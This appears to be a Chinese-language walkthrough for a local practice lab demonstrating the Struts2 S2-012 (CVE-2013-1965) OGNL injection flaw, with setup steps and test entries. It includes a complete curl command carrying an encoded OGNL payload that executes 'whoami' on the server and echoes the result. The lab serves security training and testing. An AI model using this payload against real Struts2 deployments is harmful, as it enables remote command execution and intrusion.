# struts2-s2-012 操作教程

- 类型：单体靶场
- 目录：`struts2-s2-012`
- 端口：`9960`
- 推荐入口：`/index.action`

## 这是什么

Struts2 `S2-012 / CVE-2013-1965` 演示靶场。漏洞点是 `redirect` result 里用了 `${name}`；当 Action 返回 `redirect` 时，Struts2 取出 `name` 的值拼接跳转地址，并在过程中解析其中的 OGNL。

## 启动前准备

1. 在仓库根目录执行 `bash run-local-build.sh`。
2. 等待对应容器启动完成，并确认端口 `9960` 已经监听。
3. 如果你还想通过首页统一发包，再额外确认 `http://宿主机IP:5000/` 能打开。

## 方式一：通过页面点击测试

1. 打开 `http://宿主机IP:9960/index.action`。
2. 用页面按钮把 payload 填到 `name`。
3. 点击 `触发 redirect`，观察响应里是否直接回显命令结果。

## 方式二：通过首页测试

1. 打开 `http://宿主机IP:5000/`。
2. 在搜索框输入 `struts2_s2_012、s2-012、struts2` 过滤到当前项目。
3. 先跑 `struts2_s2_012_attack_whoami`。
4. 再跑 `struts2_s2_012_normal` 看基线页面。

推荐直接使用的首页条目：
- `struts2_s2_012_attack_whoami`：通过 redirect 变量执行 `whoami`
- `struts2_s2_012_normal`：页面基线访问

## 方式三：直接访问接口测试

1. 触发漏洞：

```bash
curl -i -X POST "http://宿主机IP:9960/user.action" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "flow=redirect&name=%25%7B%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%22whoami%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew+char%5B512%5D%2C%23n%3D%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new+java.lang.String%28%23e%2C0%2C%23n%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%7D"
```

2. 基线访问：

```bash
curl -i "http://宿主机IP:9960/index.action"
```

## 测试时重点看什么

1. `flow=redirect` 是否进入危险的 redirect result。
2. `name` 里的表达式是否在拼接 `${name}` 时被执行。
3. 普通访问首页时是否只看到表单，不出现异常回显。

## 相关入口

- 总控台：`http://宿主机IP:5000/`
- 文档索引：[`doc/README.md`](../README.md)
- 根项目说明：[`README.md`](../../README.md)
